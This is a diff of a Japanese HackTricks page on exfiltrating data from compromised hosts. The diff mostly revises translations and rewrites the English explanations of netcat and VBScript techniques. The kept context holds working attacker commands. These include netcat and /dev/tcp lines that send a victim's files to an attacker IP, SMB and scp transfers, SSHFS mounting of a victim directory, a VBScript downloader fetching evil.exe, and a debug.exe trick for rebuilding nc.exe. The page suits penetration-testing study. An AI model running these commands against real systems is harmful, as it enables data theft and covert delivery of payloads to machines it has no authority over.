@@ -1,32 +1,32 @@
-# 情報の外部への持ち出し
+# 情報の外部流出
 
 <details>
 
-<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**で**ゼロからヒーローまでのAWSハッキング**を学びましょう！</strong></summary>
+<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**で**ゼロからヒーローまでAWSハッキングを学ぶ**</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>こちら</strong></a><strong>！</strong></summary>
 
-HackTricksをサポートする他の方法：
+HackTricksをサポートする他の方法:
 
-- **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-- **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)をフォローする
-- **ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する**
+* **HackTricksで企業を宣伝したい**か**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを見つける
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)を**フォロー**する。
+* **ハッキングテクニックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**
 
 </details>
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 ***
 
-## 情報の外部への持ち出しに使用される一般的にホワイトリストに登録されているドメイン
+## 情報を外部流出させるための一般的にホワイトリストに登録されているドメイン
 
-一般的に悪用される可能性のあるホワイトリストに登録されているドメインを見つけるには、[https://lots-project.com/](https://lots-project.com/)をチェックしてください
+[https://lots-project.com/](https://lots-project.com/)をチェックして、悪用できる一般的にホワイトリストに登録されているドメインを見つける
 
-## Base64のコピー＆ペースト
+## Base64をコピー＆ペースト
 
 **Linux**
 ```bash
@@ -187,36 +187,35 @@ service smbd restart
 ```
 ## Exfiltration
 
-### Exfiltration Techniques
+### Introduction
 
-Exfiltration techniques are used to **steal** data from a target network. Once an attacker gains access to a network, they need to find a way to exfiltrate the data they are after. There are several common exfiltration techniques:
+Exfiltration is the unauthorized transfer of data from a target. This can be achieved through various methods, such as:
 
-- **Compression**: Compressing data before exfiltrating it can help avoid detection.
-- **Encryption**: Encrypting data makes it harder for security tools to detect the exfiltrated data.
-- **Steganography**: Hiding data within other files or messages can help evade detection.
-- **Traffic **: Sending data out in small, inconspicuous chunks can help avoid detection.
-- **DNS Tunneling**: Sending data over DNS requests can bypass some security controls.
-- **Exfiltration over Alternative Protocols**: Using protocols other than HTTP/HTTPS can help avoid detection.
+- **Direct exfiltration**: Data is sent directly from the target to an external location.
+- **Indirect exfiltration**: Data is first sent to an intermediate location before being transferred to an external location.
+- **Covert exfiltration**: Data is hidden within other legitimate network traffic to avoid detection.
 
-### Exfiltration Tools
+### Techniques
 
-There are several tools available to help with exfiltrating data from a target network. Some popular tools include:
+#### Common Exfiltration Techniques
 
-- **Netcat**: A versatile networking utility that can be used for exfiltration.
-- **Wget**: A command-line utility for downloading files, which can be used to exfiltrate data.
-- **Curl**: Another command-line tool for transferring data with support for various protocols.
-- **FTP**: File Transfer Protocol can be used for exfiltrating data over a network.
-- **SCP**: Secure Copy Protocol can securely transfer files between hosts on a network.
+1. **Compression**: Data is compressed before exfiltration to reduce its size and avoid detection.
+2. **Encryption**: Data is encrypted to prevent unauthorized access during exfiltration.
+3. **Steganography**: Data is hidden within other files or data to avoid detection.
+4. **Protocol Manipulation**: Data is sent using non-standard protocols to bypass security controls.
+5. **DNS Tunneling**: Data is exfiltrated through DNS requests to avoid detection.
 
-### Exfiltration Resources
+### Tools
 
-In addition to tools, there are resources available to help with exfiltration:
+#### Exfiltration Tools
 
-- **GitHub**: A popular platform for finding exfiltration tools and resources.
-- **Forums**: Online forums can be a valuable resource for learning about exfiltration techniques.
-- **Blogs**: Security blogs often contain information about exfiltration methods and tools.
-- **Tutorials**: Online tutorials can provide step-by-step guidance on exfiltrating data from a network.
-- **Books**: There are books available that cover exfiltration techniques in detail.
+1. **Netcat**: A versatile networking tool that can be used for exfiltration.
+2. **Wget**: A command-line utility for downloading files, which can be used for exfiltration.
+3. **Curl**: Another command-line tool for transferring data, useful for exfiltration.
+
+### Conclusion
+
+Exfiltration is a critical phase of the attack lifecycle, where the attacker attempts to steal valuable data from the target. By understanding exfiltration techniques and using appropriate tools, attackers can successfully transfer data without being detected.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -232,7 +231,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-被害者がSSHを持っている場合、攻撃者は被害者から攻撃者にディレクトリをマウントできます。
+被害者がSSHを持っている場合、攻撃者は被害者から攻撃者にディレクトリをマウントすることができます。
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -244,33 +243,19 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 
 #### Description
 
-The Netcat (`nc`) utility is a versatile tool that can be used for data exfiltration. It allows for creating a connection between two systems, enabling the transfer of data between them. Netcat can be used to send files, directories, or even entire hard drive images over a network.
+The Netcat utility, or `nc`, is a versatile tool that can be used for data exfiltration. Netcat can create a connection between a source and a destination, allowing for the transfer of data between them. This can be leveraged by an attacker to exfiltrate sensitive information from a target network.
 
 #### Methodology
 
-1. **Listener Setup**: Start a listener on the receiving system using the following command:
-   ```bash
-   nc -lvp <port> > output.file
-   ```
+1. **Listener Setup**: The attacker sets up a listener on a machine outside the target network using Netcat.
 
-2. **Sender Setup**: Initiate a connection from the sending system to the listener using the following command:
-   ```bash
-   nc <receiver_ip> <port> < input.file
-   ```
+2. **Data Transfer**: Netcat is then used on the compromised machine within the target network to connect to the listener set up by the attacker. Data can be transferred between the two machines through this connection.
 
-3. **Data Transfer**: Data will be transferred from the sender to the listener and saved in the `output.file` on the receiving system.
+3. **Exfiltration**: The attacker can exfiltrate sensitive data by redirecting the output of commands or by transferring files using Netcat.
 
 #### Detection
 
-- Monitor network traffic for suspicious connections using Netcat.
-- Look for unusual data transfers over non-standard ports.
-- Implement egress filtering to restrict the use of Netcat on systems.
-
-#### Prevention
-
-- Disable or restrict the use of Netcat on systems where it is not required.
-- Implement network segmentation to limit the scope of potential data exfiltration.
-- Use encryption to secure data being transferred over the network.
+Monitoring network traffic for suspicious connections to external machines, especially using uncommon ports, can help in detecting data exfiltration using Netcat. Conducting regular security audits and implementing network segmentation can also aid in detecting and preventing such attacks.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -282,7 +267,7 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### ターゲットにファイルをアップロード
+### 被害者へのファイルアップロード
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -343,9 +328,37 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-### VBScript Exfiltration
+### VBScript Exfiltration Techniques
 
-VBScript can be used to exfiltrate data by sending it over HTTP or HTTPS to an external server. This can be achieved by creating an HTTP request object, setting the request headers and body with the data to be exfiltrated, and sending the request to a remote server. This technique can be used to bypass network restrictions and exfiltrate data without directly connecting to the target network.
+VBScript can be used to exfiltrate data from a compromised system. Below are some common techniques used for data exfiltration using VBScript:
+
+1. **Writing to Files**: VBScript can write data to files on the system, which can then be transferred out.
+
+2. **Sending Emails**: VBScript can be used to send emails with the exfiltrated data as attachments or within the email body.
+
+3. **HTTP Requests**: VBScript can make HTTP requests to external servers, sending the exfiltrated data in the request payload.
+
+4. **DNS Tunneling**: VBScript can encode data in DNS requests and responses to exfiltrate information covertly.
+
+5. **FTP Transfer**: VBScript can be used to transfer files via FTP to an external server.
+
+6. **Executing Commands**: VBScript can execute commands to exfiltrate data through various means.
+
+### Detection and Prevention
+
+To detect and prevent data exfiltration via VBScript, consider the following measures:
+
+- **Monitoring File Writes**: Monitor for suspicious file write activities by VBScript.
+  
+- **Network Traffic Analysis**: Analyze network traffic for any unusual patterns or connections made by VBScript.
+
+- **Email Filtering**: Implement email filtering to prevent VBScript from sending out exfiltrated data via emails.
+
+- **Firewall Rules**: Configure firewall rules to restrict VBScript from making unauthorized network connections.
+
+- **Behavioral Analysis**: Conduct behavioral analysis to detect any abnormal behavior exhibited by VBScript.
+
+By implementing these detection and prevention measures, organizations can enhance their security posture against data exfiltration using VBScript.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -383,7 +396,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe`プログラムは、バイナリの検査だけでなく、**16進数からバイナリを再構築する機能**も持っています。これは、バイナリの16進数を提供することで、`debug.exe`がバイナリファイルを生成できることを意味します。ただし、`debug.exe`には**64 kbまでのファイルをアセンブリングするという制限**があることに注意することが重要です。
+`debug.exe`プログラムは、バイナリの検査だけでなく、**16進数からバイナリを再構築する機能**も持っています。これはつまり、バイナリの16進数を提供することで、`debug.exe`がバイナリファイルを生成できるということです。ただし、`debug.exe`には**64 kbまでのファイルをアセンブルするという制限**があることに注意することが重要です。
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -392,23 +405,3 @@ wine exe2bat.exe nc.exe nc.txt
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
-
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-<details>
-
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>を使用して、ゼロからヒーローまでAWSハッキングを学びましょう！</summary>
-
-HackTricksをサポートする他の方法：
-
-* **HackTricksで企業を宣伝したい**場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手してください
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)で**フォロー**してください
-* **HackTricks**および**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください
-
-</details>
